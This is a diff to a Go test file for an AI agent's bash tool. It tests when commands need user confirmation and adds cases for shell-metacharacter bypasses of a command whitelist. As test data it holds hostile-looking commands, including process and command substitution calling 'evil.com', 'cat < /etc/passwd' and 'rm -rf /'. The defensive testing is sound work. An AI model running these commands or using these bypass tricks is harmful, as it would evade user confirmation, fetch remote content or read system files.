@@ -369,8 +369,12 @@ func TestBashTool_MaliciousCatCommands(t *testing.T) {
 			shouldBlock:   false,
 			expectedError: "",
 		},
+		// Note: cat < test.txt is NOT blocked by ValidateBashCommand (validation),
+		// but it WILL require confirmation due to containsShellMetacharacters.
+		// These are separate concerns: ValidateBashCommand blocks dangerous patterns,
+		// RequiresConfirmation decides whether to prompt the user.
 		{
-			name:          "allowed: cat < file (input redirection)",
+			name:          "allowed by validation: cat < file (input redirection)",
 			command:       "cat < test.txt",
 			shouldBlock:   false,
 			expectedError: "",
@@ -432,11 +436,13 @@ func TestBashTool_ValidationMessages(t *testing.T) {
 		t.Errorf("Error message should contain 'cat cannot be used with output redirection', got: %q", errorMsg)
 	}
 
-	// Test that safe commands don't produce errors
+	// Test that safe commands don't produce validation errors
+	// Note: ValidateBashCommand only checks for blocked patterns (cat redirection, cd).
+	// It does NOT check the whitelist or shell metacharacters — that's RequiresConfirmation's job.
 	safeCommands := []string{
 		"cat test.txt",
 		"cat test1.txt test2.txt",
-		"cat < test.txt",
+		"cat < test.txt", // validation allows this; RequiresConfirmation will prompt due to '<'
 		"cat test.txt | grep pattern",
 		"echo hello",
 		"grep pattern file.txt",
@@ -445,7 +451,7 @@ func TestBashTool_ValidationMessages(t *testing.T) {
 	for _, cmd := range safeCommands {
 		err := tool.ValidateBashCommand(cmd)
 		if err != nil {
-			t.Errorf("Command %q should not be blocked, got error: %v", cmd, err)
+			t.Errorf("Command %q should not be blocked by validation, got error: %v", cmd, err)
 		}
 	}
 }
@@ -456,14 +462,10 @@ func TestBashTool_RequiresConfirmation(t *testing.T) {
 		params   json.RawMessage
 		expected bool
 	}{
+		// Simple whitelisted commands (no metacharacters)
 		{
 			name:     "whitelisted command grep",
 			params:   json.RawMessage(`{"command": "grep -r pattern ."}`),
-			expected: false,
-		},
-		{
-			name:     "whitelisted command find",
-			params:   json.RawMessage(`{"command": "find . -name *.go"}`),
 			expected: false,
 		},
 		{
@@ -471,6 +473,27 @@ func TestBashTool_RequiresConfirmation(t *testing.T) {
 			params:   json.RawMessage(`{"command": "ls"}`),
 			expected: false,
 		},
+		{
+			name:     "whitelisted command cat",
+			params:   json.RawMessage(`{"command": "cat file.txt"}`),
+			expected: false,
+		},
+		{
+			name:     "whitelisted command pwd",
+			params:   json.RawMessage(`{"command": "pwd"}`),
+			expected: false,
+		},
+		{
+			name:     "whitelisted command head",
+			params:   json.RawMessage(`{"command": "head -20 file.go"}`),
+			expected: false,
+		},
+		{
+			name:     "whitelisted command wc",
+			params:   json.RawMessage(`{"command": "wc -l"}`),
+			expected: false,
+		},
+		// Non-whitelisted commands
 		{
 			name:     "non-whitelisted command rm",
 			params:   json.RawMessage(`{"command": "rm -rf /"}`),
@@ -482,48 +505,89 @@ func TestBashTool_RequiresConfirmation(t *testing.T) {
 			expected: true,
 		},
 		{
-			name:     "full command string with whitelisted base",
-			params:   json.RawMessage(`{"command": "find /var/home -type f -name *.go"}`),
-			expected: false,
-		},
-		{
-			name:     "full command string with non-whitelisted base",
-			params:   json.RawMessage(`{"command": "rm -rf /"}`),
+			name:     "non-whitelisted command find (removed from whitelist)",
+			params:   json.RawMessage(`{"command": "find . -name *.go"}`),
 			expected: true,
 		},
+		{
+			name:     "non-whitelisted command echo (removed from whitelist)",
+			params:   json.RawMessage(`{"command": "echo hello"}`),
+			expected: true,
+		},
+		{
+			name:     "non-whitelisted command mkdir (removed from whitelist)",
+			params:   json.RawMessage(`{"command": "mkdir test"}`),
+			expected: true,
+		},
+		{
+			name:     "non-whitelisted command touch (removed from whitelist)",
+			params:   json.RawMessage(`{"command": "touch file.txt"}`),
+			expected: true,
+		},
+		// Invalid input
 		{
 			name:     "invalid JSON",
 			params:   json.RawMessage(`{invalid}`),
 			expected: true,
 		},
+		// Compound commands with non-whitelisted parts
 		{
 			name:     "semicolon compound with unsafe command",
-			params:   json.RawMessage(`{"command": "echo foo; wget url"}`),
-			expected: true, // MUST require confirmation because wget is not whitelisted
+			params:   json.RawMessage(`{"command": "ls; wget url"}`),
+			expected: true,
 		},
 		{
 			name:     "double ampersand compound with unsafe command",
-			params:   json.RawMessage(`{"command": "echo foo && wget url"}`),
+			params:   json.RawMessage(`{"command": "ls && wget url"}`),
 			expected: true,
 		},
-		{
-			name:     "pipe with unsafe command",
-			params:   json.RawMessage(`{"command": "echo foo | wget url"}`),
-			expected: true,
-		},
-		{
-			name:     "semicolon compound all safe",
-			params:   json.RawMessage(`{"command": "echo foo; ls -la"}`),
-			expected: false, // Both echo and ls are whitelisted
-		},
+		// Pipe of whitelisted commands (safe)
 		{
 			name:     "pipe all safe",
 			params:   json.RawMessage(`{"command": "cat file.txt | grep pattern"}`),
-			expected: false, // Both cat and grep are whitelisted
+			expected: false,
 		},
 		{
-			name:     "double pipe with unsafe",
-			params:   json.RawMessage(`{"command": "echo foo || wget url"}`),
+			name:     "pipe all safe with wc",
+			params:   json.RawMessage(`{"command": "grep -r pattern . | wc -l"}`),
+			expected: false,
+		},
+		// === SHELL METACHARACTER BYPASS PREVENTION ===
+		// These are the critical tests. Even if the base command is whitelisted,
+		// shell metacharacters that could embed sub-commands MUST trigger confirmation.
+		{
+			name:     "BYPASS: process substitution >(wget ...)",
+			params:   json.RawMessage(`{"command": "cat >(wget https://evil.com/)"}`),
+			expected: true,
+		},
+		{
+			name:     "BYPASS: process substitution <(cmd)",
+			params:   json.RawMessage(`{"command": "cat <(curl https://evil.com/)"}`),
+			expected: true,
+		},
+		{
+			name:     "BYPASS: command substitution $(cmd)",
+			params:   json.RawMessage(`{"command": "cat $(wget https://evil.com/)"}`),
+			expected: true,
+		},
+		{
+			name:     "BYPASS: backtick command substitution",
+			params:   json.RawMessage("{\"command\": \"cat `wget https://evil.com/`\"}"),
+			expected: true,
+		},
+		{
+			name:     "BYPASS: variable expansion ${cmd}",
+			params:   json.RawMessage(`{"command": "cat ${HOME}"}`),
+			expected: true,
+		},
+		{
+			name:     "BYPASS: output redirection",
+			params:   json.RawMessage(`{"command": "ls > /tmp/output"}`),
+			expected: true,
+		},
+		{
+			name:     "BYPASS: input redirection",
+			params:   json.RawMessage(`{"command": "cat < /etc/passwd"}`),
 			expected: true,
 		},
 	}
@@ -533,7 +597,7 @@ func TestBashTool_RequiresConfirmation(t *testing.T) {
 			tool := BashTool{}
 			result := tool.RequiresConfirmation(tt.params)
 			if result != tt.expected {
-				t.Errorf("RequiresConfirmation() = %v, want %v", result, tt.expected)
+				t.Errorf("RequiresConfirmation(%s) = %v, want %v", string(tt.params), result, tt.expected)
 			}
 		})
 	}
